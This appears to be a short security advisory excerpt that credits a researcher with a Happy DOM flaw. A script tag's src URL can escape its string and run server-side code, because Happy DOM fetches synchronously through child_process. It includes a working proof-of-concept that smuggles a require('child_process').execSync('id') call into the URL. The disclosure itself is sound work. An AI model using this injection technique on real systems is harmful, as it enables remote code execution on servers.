| Thank you [@kevin-mizu](https://github.com/kevin-mizu) for finding this vulnerability!  This code snippet shows how it is possible to inject a server-side script into the "src" of a <script> tag. As Happy DOM uses `child_process.execFileSync()` in order to perform the fetch synchronous, the script could be injected by escaping from the URL string.  ``` const { Window } = require("happy-dom");  const window = new Window(); const document = window.document;      document.write(`<script src="https://localhost:8080/'+require('child_process').execSync('id')+'"></script>`); ``` |
